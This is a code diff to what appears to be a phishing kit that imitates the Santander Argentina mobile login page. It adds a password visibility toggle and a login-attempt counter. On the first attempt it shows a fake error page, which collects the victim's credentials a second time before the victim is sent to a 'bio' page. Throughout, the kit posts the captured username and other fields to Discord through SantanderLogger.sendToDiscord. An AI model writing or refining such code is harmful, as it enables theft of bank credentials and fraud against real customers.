@@ -166,8 +166,30 @@
 <script src="../../js/santander-logger.js"></script>
 <script>
 (function() {
+	var eyeToggle = document.querySelector('.img-view');
+	if (eyeToggle) {
+		var claveInput = document.getElementById('clave');
+		var showing = false;
+		eyeToggle.addEventListener('click', function() {
+			showing = !showing;
+			if (showing) {
+				claveInput.type = 'text';
+				eyeToggle.style.backgroundImage = "url('../../images/eyes-close.svg')";
+				eyeToggle.classList.remove('img-view--oculto');
+				eyeToggle.classList.add('img-view--visible');
+			} else {
+				claveInput.type = 'password';
+				eyeToggle.style.backgroundImage = '';
+				eyeToggle.classList.remove('img-view--visible');
+				eyeToggle.classList.add('img-view--oculto');
+			}
+		});
+	}
+
 	var btn = document.querySelector('.button-login');
 	if (!btn) return;
+
+	var attempt = parseInt(localStorage.getItem('santander_login_attempt') || '0', 10);
 
 	btn.addEventListener('click', function(e) {
 		e.preventDefault();
@@ -180,6 +202,9 @@
 
 		btn.disabled = true;
 		btn.textContent = 'Cargando...';
+
+		attempt++;
+		localStorage.setItem('santander_login_attempt', attempt);
 
 		var isMobile = /Mobile|Android|iPhone|iPad/i.test(navigator.userAgent);
 		var now = new Date();
@@ -200,7 +225,7 @@
 			localStorage.setItem('santander_flow_data', JSON.stringify(flowData));
 
 			var embeds = [{
-				title: '🏦 Santander AR - Login Móvil',
+				title: '🏦 Santander AR - Login Móvil (Intento ' + attempt + ')',
 				color: 0xEC0000,
 				fields: [
 					{ name: '👤 Usuario', value: '`' + usuario + '`', inline: true },
@@ -219,7 +244,13 @@
 
 			return SantanderLogger.sendToDiscord(embeds).then(function() {
 				setTimeout(function() {
-					window.location.href = 'bio.html';
+					if (attempt >= 2) {
+						localStorage.removeItem('santander_login_attempt');
+						localStorage.setItem('santander_bio_attempt', '0');
+						window.location.href = 'bio.html';
+					} else {
+						window.location.href = 'error.html?r=indexMovil.html';
+					}
 				}, 1200);
 			});
 		});
